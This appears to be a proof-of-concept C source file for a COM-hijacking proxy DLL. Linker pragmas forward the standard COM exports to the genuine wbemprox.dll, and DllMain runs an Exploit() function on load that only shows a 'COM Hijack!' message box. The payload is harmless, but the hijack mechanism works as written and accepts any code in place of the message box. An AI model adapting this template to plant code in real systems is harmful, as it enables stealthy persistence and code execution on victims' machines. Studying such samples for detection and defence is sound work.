#include <windows.h>

#ifdef _MSC_VER
#pragma comment(lib, "user32.lib")
#pragma comment(linker, "/export:DllCanUnloadNow=\"C:\\Windows\\System32\\wbem\\wbemprox.Dll.DllCanUnloadNow\"")
#pragma comment(linker, "/export:DllGetClassObject=\"C:\\Windows\\System32\\wbem\\wbemprox.Dll.DllGetClassObject\"")
#pragma comment(linker, "/export:DllRegisterServer=\"C:\\Windows\\System32\\wbem\\wbemprox.Dll.DllRegisterServer\"")
#pragma comment(linker, "/export:DllUnregisterServer=\"C:\\Windows\\System32\\wbem\\wbemprox.Dll.DllUnregisterServer\"")
#endif

VOID Exploit()
{
	MessageBoxA( NULL, "COM Hijack!", "COM Hijacking", MB_OK );
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
	switch( dwReason ) 
    {
		case DLL_PROCESS_ATTACH:
			Exploit();
			break;
		case DLL_PROCESS_DETACH:
            break;
		case DLL_THREAD_ATTACH:
            break;
		case DLL_THREAD_DETACH:
            break;
    }
	return TRUE;
}
